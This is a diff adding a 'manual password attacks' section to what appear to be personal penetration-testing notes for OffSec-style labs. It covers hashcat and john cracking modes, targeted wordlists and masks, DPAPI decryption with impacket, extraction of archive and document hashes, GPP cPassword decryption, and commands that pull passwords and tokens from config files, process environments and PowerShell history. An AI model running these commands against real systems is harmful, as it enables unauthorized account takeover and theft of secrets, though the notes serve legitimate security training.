@@ -430,6 +430,181 @@ crackr -f keepass.hash -m 13400 -q
 
 ---
 
+---
+
+## When crackr Fails — Manual Password Attacks
+
+> [!important] If the script's wordlist attacks fail, these are your escalation paths. Work through them in order — stop as soon as something cracks.
+
+---
+
+### Identify What You Have Before Choosing an Attack
+
+```bash
+# Auto-detect hash type
+hashid hash.txt
+hashcat --example-hashes | grep -A3 "NTLM\|sha512\|bcrypt"
+
+# hashcat mode reference
+# 1000  = NTLM (Windows)
+# 5600  = NTLMv2 (Net-NTLMv2, from Responder)
+# 13100 = Kerberoast (TGS-REP etype 23)
+# 18200 = AS-REP (etype 23)
+# 1800  = sha512crypt (Linux /etc/shadow $6$)
+# 500   = md5crypt ($1$)
+# 3200  = bcrypt ($2y$)
+# 13400 = KeePass
+# 22000 = WPA2
+# 7z, zip = 11600, 13600
+```
+
+---
+
+### When rockyou Doesn't Work
+
+**Targeted wordlists based on context:**
+```bash
+# Build a wordlist from the target website (company names, product names, key people)
+cewl http://target.com -d 3 -m 5 -w cewl.txt
+cewl http://target.com -d 3 -m 5 --with-numbers -w cewl_nums.txt
+
+# Mutate the CeWL list with common password rules
+hashcat -m 1000 hash.txt cewl.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 1000 hash.txt cewl.txt -r /usr/share/hashcat/rules/dive.rule
+
+# Common OffSec-context wordlists (beyond rockyou)
+hashcat -m 1000 hash.txt /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+hashcat -m 1000 hash.txt /usr/share/seclists/Passwords/darkweb2017-top10000.txt
+hashcat -m 1000 hash.txt /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
+```
+
+**Pattern/mask attacks when you have hints:**
+```bash
+# If password policy requires: upper + lower + digit + 8 chars min
+hashcat -m 1000 hash.txt -a 3 '?u?l?l?l?l?d?d?d'   # e.g., Password123
+hashcat -m 1000 hash.txt -a 3 '?u?l?l?l?d?d?d?d'   # e.g., Pass1234
+hashcat -m 1000 hash.txt -a 3 'Company?d?d?d!'       # e.g., Acme123!
+hashcat -m 1000 hash.txt -a 3 '?u?l?l?l?d?d?d!'     # e.g., Pass123!
+hashcat -m 1000 hash.txt -a 3 'Summer?d?d?d?d'       # season + year
+hashcat -m 1000 hash.txt -a 3 '?u?l?l?d?d?d?d!'     # e.g., Abc1234!
+
+# If you know the username is probably the base (jsmith → Jsmith1, Jsmith!)
+echo "jsmith" | hashcat -m 1000 hash.txt --stdin -r /usr/share/hashcat/rules/best64.rule
+```
+
+---
+
+### NTLMv2 Hashes (From Responder / Relay)
+
+```bash
+# NTLMv2 must be cracked offline — cannot be passed directly
+# Format: user::domain:challenge:response:blob
+hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
+
+# If rockyou fails, try mutations
+hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
+
+# john equivalent
+john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2.txt
+```
+
+---
+
+### DPAPI — Credential Blobs From lootr/Windows
+
+```bash
+# DPAPI master key + credential blobs
+# Transfer the following from target to Kali:
+# - C:\Users\user\AppData\Roaming\Microsoft\Protect\<SID>\<master-key-file>
+# - C:\Users\user\AppData\Roaming\Microsoft\Credentials\*
+
+# Decrypt with domain backup key (requires DC access)
+impacket-dpapi backupkeys --export -t corp.local/admin:pass@DC_IP
+impacket-dpapi masterkey -file <masterkey-file> -pvk ntds_capi_0.pvk
+impacket-dpapi credential -file <credential-file> -key <decrypted-master-key>
+
+# Decrypt with user password (offline)
+impacket-dpapi masterkey -file <masterkey-file> -password userpass -sid user-SID
+```
+
+---
+
+### KeePass / Password Managers
+
+```bash
+# KeePass 2.x — extract hash
+keepass2john Database.kdbx | sed 's/^[^:]*://' > keepass.hash
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
+# If that fails: target-specific mutations with cewl output
+
+# KeePass 1.x
+keepass2john Database.kdb | sed 's/^[^:]*://' > keepass1.hash
+hashcat -m 13400 keepass1.hash /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+### Archives and Office Documents
+
+```bash
+# ZIP with password
+zip2john protected.zip > zip.hash
+hashcat -m 17210 zip.hash /usr/share/wordlists/rockyou.txt   # WinZip AES
+hashcat -m 13600 zip.hash /usr/share/wordlists/rockyou.txt   # WinZip
+
+# 7z
+7z2john protected.7z > 7z.hash
+hashcat -m 11600 7z.hash /usr/share/wordlists/rockyou.txt
+
+# Office documents (Word/Excel)
+office2john document.docx > office.hash
+hashcat -m 9600 office.hash /usr/share/wordlists/rockyou.txt  # Office 2013
+hashcat -m 9500 office.hash /usr/share/wordlists/rockyou.txt  # Office 2010
+
+# PDF
+pdf2john document.pdf > pdf.hash
+hashcat -m 10500 pdf.hash /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+### GPP cPassword (Group Policy Preferences)
+
+```bash
+# If you find Groups.xml, Services.xml, Scheduledtasks.xml, Printers.xml in SYSVOL
+# Extract the cPassword value, then decrypt:
+gpp-decrypt '<cPassword_value>'
+
+# Search SYSVOL manually:
+find /mnt/sysvol -name "*.xml" 2>/dev/null | xargs grep -l "cpassword" 2>/dev/null
+# Or from Kali with creds:
+nxc smb DC_IP -u user -p pass -M gpp_password
+```
+
+---
+
+### When Nothing Cracks — Alternate Credential Sources
+
+If a hash won't crack, look for the plaintext elsewhere:
+
+```bash
+# Config files on the target (run after lootr.sh)
+grep -riE 'password|passwd|secret|credential|api.key' /var/www/ /etc/ /opt/ 2>/dev/null | \
+  grep -v Binary | head -30
+
+# Environment variables on running processes (Linux)
+strings /proc/*/environ 2>/dev/null | grep -iE 'pass|pwd|token|secret|key' | sort -u
+
+# PowerShell history (Windows — often has passwords typed in commands)
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Windows event logs (4624 = successful logon, often shows plaintext in old configs)
+wevtutil qe Security /q:"*[System[EventID=4648]]" /f:text /rd:true /c:10
+```
+
+---
+
 ## Related
 
 - [[Passwords]] — manual password attack techniques and methodology
